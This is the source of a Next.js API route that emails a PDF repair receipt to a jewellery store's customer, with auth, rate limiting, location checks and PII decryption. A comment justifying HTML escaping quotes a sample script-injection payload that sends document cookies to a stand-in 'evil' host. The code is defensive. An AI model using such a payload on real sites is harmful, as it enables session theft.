import { NextRequest, NextResponse } from "next/server";
import { createClient } from "@/lib/supabase/server";
import { createAdminClient } from "@/lib/supabase/admin";
import { renderToBuffer, type DocumentProps } from "@react-pdf/renderer";
import RepairTicketPDF from "@/lib/pdf/RepairTicketPDF";
import { resend } from "@/lib/email/resend";
import React, { type JSXElementConstructor, type ReactElement } from "react";
import { checkRateLimit } from "@/lib/rate-limit";
import { assertUserCanAccessLocation, LocationAccessDeniedError } from "@/lib/auth/assert-location";
import { escapeHtml } from "@/lib/sanitize";
import { decryptCustomerPii } from "@/lib/customer-pii";
import logger from "@/lib/logger";
import { withSentryFlush } from "@/lib/sentry-flush";

export const POST = withSentryFlush(async (
  _req: NextRequest,
  { params }: { params: Promise<{ id: string }> },
) => {
  const { id } = await params;

  const supabase = await createClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();

  if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  // Rate limit keyed by user id (not IP) — heavy op, sends email with PDF.
  const { success } = await checkRateLimit(user.id, "heavy");
  if (!success) {
    return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 });
  }

  const { data: userData } = await supabase
    .from("users")
    .select("tenant_id")
    .eq("id", user.id)
    .single();

  if (!userData?.tenant_id)
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });

  const adminClient = createAdminClient();

  // repairs schema (verified 2026-04-25 against vkpjocnrefjfpuovzinn) does
  // NOT have customer_name / work_required / technician / completed_at /
  // notes columns. Selecting them returned PGRST204 and the route 404'd —
  // every "Email receipt" / PDF on a repair errored. Use the real columns:
  //   customer_name → customers.full_name
  //   work_required → work_description
  //   technician    → drop (no equivalent on schema)
  //   completed_at  → collected_at
  //   notes         → internal_notes
  const { data: repair, error } = await adminClient
    .from("repairs")
    .select(
      `id, repair_number, location_id, customer_id, customer_email,
       item_type, item_description, metal_type, brand, condition_notes,
       repair_type, work_description,
       priority, stage, quoted_price, final_price, deposit_amount, deposit_paid,
       due_date, collected_at, internal_notes, client_notes, created_at,
       customers(full_name, email, phone, address, pii_enc)`
    )
    .eq("id", id)
    .eq("tenant_id", userData.tenant_id)
    .single();

  if (error || !repair)
    return NextResponse.json({ error: "Not found" }, { status: 404 });

  // W2-006: a location-restricted staffer must not be able to trigger
  // an email for a repair outside their assigned locations. Otherwise
  // they could POST to /api/repair/<L2-repair-uuid>/email-receipt and
  // spam the L2 customer.
  try {
    await assertUserCanAccessLocation(user.id, userData.tenant_id, repair.location_id);
  } catch (e) {
    if (e instanceof LocationAccessDeniedError) {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 });
    }
    throw e;
  }

  const customerJoin = Array.isArray(repair.customers) ? repair.customers[0] : repair.customers;
  // W6-HIGH-14: decrypt PII bundle before reading address.
  const customerRaw = customerJoin ? await decryptCustomerPii(customerJoin) : null;
  const recipientEmail = customerRaw?.email ?? repair.customer_email;

  if (!recipientEmail)
    return NextResponse.json({ error: "Customer has no email address" }, { status: 400 });

  const { data: tenant } = await adminClient
    .from("tenants")
    .select("name, business_name, abn, phone, email, address_line1, suburb, state, postcode")
    .eq("id", userData.tenant_id)
    .single();

  const tenantAddress = [tenant?.address_line1, tenant?.suburb, tenant?.state, tenant?.postcode].filter(Boolean).join(", ");

  const ticketData = {
    ticketNumber: repair.repair_number ?? repair.id,
    tenantName: tenant?.business_name || tenant?.name || "Your Store Name",
    tenantPhone: tenant?.phone ?? undefined,
    tenantEmail: tenant?.email ?? undefined,
    tenantAddress: tenantAddress || undefined,
    tenantAbn: tenant?.abn ?? undefined,
    customerName: customerRaw?.full_name ?? null,
    customerPhone: customerRaw?.phone,
    customerEmail: customerRaw?.email ?? repair.customer_email,
    itemType: repair.item_type,
    itemDescription: repair.item_description,
    metalType: repair.metal_type,
    brand: repair.brand,
    conditionNotes: repair.condition_notes,
    repairType: repair.repair_type,
    workDescription: repair.work_description,
    priority: repair.priority,
    status: repair.stage,
    quotedPrice: repair.quoted_price,
    finalPrice: repair.final_price,
    depositAmount: repair.deposit_amount,
    depositPaid: repair.deposit_paid,
    dueDate: repair.due_date,
    technician: undefined,
    clientNotes: repair.client_notes,
    createdAt: repair.created_at,
  };

  const element = React.createElement(RepairTicketPDF, { ticket: ticketData });
   
  const buffer = await renderToBuffer(element as unknown as ReactElement<DocumentProps, JSXElementConstructor<DocumentProps>>);

  const businessName = tenant?.business_name || tenant?.name || "Jewellery Studio";
  const ticketNumber = ticketData.ticketNumber;
  const filename = `receipt-${String(ticketNumber).replace(/\//g, "-")}.pdf`;

  const storePhone = tenant?.phone ? ` | ${tenant.phone}` : "";
  const storeAddr = tenantAddress ? ` | ${tenantAddress}` : "";

  // All customer/tenant-authored fields flowing into the email HTML
  // body are escaped. Without this, a customer named
  // `<script>fetch('//evil/'+document.cookie)</script>` would inject
  // live HTML into the email client rendering (blast radius = the
  // recipient customer, but stored-injection is the classic lead-in
  // to phishing-content overlays and broken-rendering). Pattern
  // matches the refund-PDF HTML route which was already hardened.
  const esc = {
    businessName: escapeHtml(businessName),
    ticketNumber: escapeHtml(String(ticketNumber)),
    customerName: escapeHtml(ticketData.customerName || "Valued Customer"),
    itemDescription: escapeHtml(ticketData.itemDescription || ticketData.itemType || "—"),
    abn: tenant?.abn ? escapeHtml(tenant.abn) : "",
    phone: tenant?.phone ? escapeHtml(tenant.phone) : "",
    storePhone: escapeHtml(storePhone),
    storeAddr: escapeHtml(storeAddr),
  };

  const { error: sendError } = await resend.emails.send({
    from: `${businessName} <receipts@nexpura.com>`,
    to: [recipientEmail],
    replyTo: tenant?.email ? [tenant.email] : undefined,
    subject: `Your Repair Receipt — ${ticketNumber}`,
    html: `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body style="margin:0;padding:0;background:#F8F5F0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="padding:40px 20px;"><tr><td align="center">
<table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;">
  <tr><td style="background:#1A1A1A;border-radius:12px 12px 0 0;padding:28px 36px;">
    <table width="100%" cellpadding="0" cellspacing="0"><tr>
      <td><p style="margin:0;font-size:18px;font-weight:700;color:#fff;">${esc.businessName}</p>${esc.abn ? `<p style="margin:4px 0 0;font-size:11px;color:rgba(255,255,255,0.5);">ABN: ${esc.abn}</p>` : ""}</td>
      <td align="right"><p style="margin:0;font-size:11px;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:0.08em;">REPAIR RECEIPT</p><p style="margin:3px 0 0;font-size:18px;font-weight:700;color:#8B7355;">${esc.ticketNumber}</p></td>
    </tr></table>
  </td></tr>
  <tr><td style="background:#fff;padding:36px;">
    <p style="margin:0 0 6px;font-size:15px;color:#1A1A1A;font-weight:600;">Hi ${esc.customerName},</p>
    <p style="margin:0 0 24px;font-size:14px;color:#666;line-height:1.6;">Thank you for bringing in your item. Your repair receipt is attached as a PDF. Here's a summary:</p>
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#FAFAF9;border-radius:8px;margin-bottom:28px;border:1px solid #E5E2DE;"><tr><td style="padding:20px 24px;">
      <table width="100%" cellpadding="0" cellspacing="0">
        <tr><td style="padding-bottom:12px;width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Ticket #</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${esc.ticketNumber}</p></td>
        <td style="padding-bottom:12px;width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Item</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${esc.itemDescription}</p></td></tr>
        ${ticketData.quotedPrice != null ? `<tr><td style="width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Quoted Price</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">$${Number(ticketData.quotedPrice).toFixed(2)}</p></td>` : "<tr><td>"}
        <td style="width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Due Date</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${ticketData.dueDate ? new Date(ticketData.dueDate).toLocaleDateString("en-AU", {day:"numeric",month:"short",year:"numeric"}) : "To be advised"}</p></td></tr>
      </table>
    </td></tr></table>
    <p style="margin:0;font-size:13px;color:#888;line-height:1.6;">We'll contact you when your item is ready for collection. If you have any questions, please reply to this email${esc.phone ? ` or call us at ${esc.phone}` : ""}.</p>
  </td></tr>
  <tr><td style="background:#F8F5F0;border-radius:0 0 12px 12px;padding:16px 36px;border-top:1px solid #E5E2DE;">
    <p style="margin:0;font-size:11px;color:#aaa;text-align:center;">Sent by <strong>${esc.businessName}</strong>${esc.storePhone}${esc.storeAddr} using <a href="https://nexpura.com" style="color:#8B7355;text-decoration:none;">Nexpura</a></p>
  </td></tr>
</table></td></tr></table></body></html>`,
    attachments: [
      {
        filename,
        content: Buffer.from(buffer),
      },
    ],
  });

  if (sendError) {
    return NextResponse.json({ error: sendError.message }, { status: 500 });
  }

  // Log communication to customer_communications
  if (repair.customer_id) {
    // Kind C (best-effort observability log+continue). The receipt
    // email already sent successfully by the time we reach here — the
    // CRM history row is audit-trail nice-to-have, not blocking. Log
    // loudly so ops can backfill from Resend's delivery log if a
    // jeweller asks "did the customer get the receipt?" and the row
    // is missing.
    const { error: commsErr } = await adminClient.from("customer_communications").insert({
      tenant_id: userData.tenant_id,
      customer_id: repair.customer_id,
      type: "email_receipt",
      subject: `Repair Receipt — ${ticketNumber}`,
      sent_at: new Date().toISOString(),
      sent_by: user.id,
    });
    if (commsErr) {
      logger.error("[repair/email-receipt] customer_communications insert failed; receipt email already sent — backfill from Resend delivery log if needed", {
        repairId: id,
        tenantId: userData.tenant_id,
        customerId: repair.customer_id,
        err: commsErr,
      });
    }
  }

  return NextResponse.json({ success: true });
});
